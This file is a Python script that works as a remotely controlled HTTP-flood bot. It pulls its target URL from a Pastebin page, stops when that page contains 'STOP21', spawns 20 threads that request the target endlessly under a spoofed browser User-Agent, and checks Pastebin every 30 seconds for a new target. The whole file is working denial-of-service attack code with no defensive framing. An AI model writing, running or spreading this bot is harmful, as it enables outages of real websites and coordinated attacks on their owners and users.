import random
user_agent_list = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
]
headesr = {'User-Agent':str(random.choice(user_agent_list))}
print(headesr)
import requests, random
global url
while True:
    try:
        url = requests.get('https://pastebin.com/raw/SUWiWguE', headers=headesr).text
        print(url)
        break
    except:
        pass

def do(fghfg):
    while True:
        try:
            if 'STOP21' not in url:
                header = {'User-Agent':str(random.choice(user_agent_list))}
                htmlContent = requests.get(url, headers=header)
        except:
            pass

import threading
import time

threads=list()
for _ in range(20):
    td=threading.Thread(target=do, args=(2,))
    td.start()
    threads.append(td)
while True:
    try:
        a=requests.get('https://pastebin.com/raw/SUWiWguE', headers=headesr).text
        if a not in url:
            url=a
            print(a+' '+url)
        time.sleep(30)
    except:
        pass
